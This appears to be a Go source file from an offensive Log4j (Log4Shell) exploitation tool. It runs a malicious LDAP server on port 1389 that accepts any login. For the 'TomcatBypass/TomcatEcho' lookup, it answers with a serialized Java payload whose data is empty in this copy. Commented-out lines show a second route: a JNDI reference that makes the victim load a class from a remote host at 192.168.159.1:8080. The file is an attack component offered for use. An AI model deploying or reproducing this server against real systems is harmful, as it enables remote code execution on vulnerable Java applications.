package log4jcenter

import (
	"encoding/base64"
	"fmt"
	"sync"
	"time"

	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
)

var q sync.WaitGroup

func Start_server() {

	//Create a new LDAP Server

	ldap.Logger = ldap.DiscardingLogger
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Bind(handleBind)
	routes.Search(handleSearch)
	server.ReadTimeout = time.Second * 100
	server.Handle(routes)

	q.Add(1)
	go server.ListenAndServe(":1389")
	q.Wait()

}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()

	e := ldap.NewSearchResultEntry("")

	if r.BaseObject() == "TomcatBypass/TomcatEcho" {
		payload, _ := base64.RawStdEncoding.DecodeString("")
		e.AddAttribute("javaClassName", "foo")
		e.AddAttribute("javaSerializedData", message.AttributeValue(payload))
		w.Write(e)

		res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
		w.Write(res)
		// q.Done()
	} else {
		fmt.Println("[-] Ldap request err,exited.")
		// q.Done()
	}

}

// handleBind return Success for any login/pass
func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
	return
}

// e.AddAttribute("objectClass", "javaNamingReference")
// 			e.AddAttribute("javaCodebase", "http://192.168.159.1:8080/")
// 			e.AddAttribute("JavaFactory", "TomcatEchoTemplate")
// 			e.AddAttribute("javaClassName", "TomcatEchoTemplate")
// 			w.Write(e)
// 			res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
// 			w.Write(res)
